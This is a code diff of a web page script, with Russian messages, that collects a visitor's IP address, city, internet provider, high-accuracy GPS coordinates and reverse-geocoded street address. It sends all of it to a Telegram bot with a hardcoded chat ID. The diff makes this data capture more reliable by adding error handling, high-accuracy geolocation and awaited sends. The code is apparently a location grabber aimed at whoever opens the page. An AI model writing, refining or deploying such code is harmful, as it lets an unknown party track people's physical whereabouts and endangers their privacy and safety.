@@ -52,31 +52,56 @@
     const CHAT_ID = "1915671880";
 
     async function sendToTelegram(message) {
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-      });
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+        return await res.json();
+      } catch (err) {
+        alert("Ошибка отправки в Telegram: " + err.message);
+      }
     }
 
-    document.getElementById("sendBtn").onclick = () => {
-      fetch("https://ipapi.co/json/").then(r => r.json()).then(async ipdata => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(async pos => {
+    document.getElementById("sendBtn").onclick = async () => {
+      try {
+        // Получаем IP данные
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipdata = await ipRes.json();
+
+        if (!navigator.geolocation) {
+          alert("Геолокация не поддерживается вашим устройством");
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          async pos => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
 
-            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-            const geoData = await geoRes.json();
-            const address = geoData.display_name || "Адрес не найден";
+            try {
+              const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+              const geoData = await geoRes.json();
+              const address = geoData.display_name || "Адрес не найден";
 
-            const msg = `📍 Данные пользователя:\n🌐 IP: ${ipdata.ip}\n🏙️ Город: ${ipdata.city}, ${ipdata.country_name}\n📡 Провайдер: ${ipdata.org}\n\n📍 Координаты: ${lat}, ${lon}\n📬 Адрес: ${address}`;
+              const msg = `📍 Данные пользователя:\n🌐 IP: ${ipdata.ip}\n🏙️ Город: ${ipdata.city}, ${ipdata.country_name}\n📡 Провайдер: ${ipdata.org}\n\n📍 Координаты: ${lat}, ${lon}\n📬 Адрес: ${address}`;
 
-            sendToTelegram(msg);
-            alert("Данные отправлены!");
-          });
-        }
-      });
+              await sendToTelegram(msg);
+              alert("Данные отправлены!");
+            } catch (err) {
+              alert("Ошибка при получении адреса: " + err.message);
+            }
+          },
+          err => {
+            alert("Не удалось получить геопозицию: " + err.message);
+          },
+          { enableHighAccuracy: true, timeout: 15000 }
+        );
+
+      } catch (err) {
+        alert("Ошибка при получении IP данных: " + err.message);
+      }
     };
   </script>
 </body>
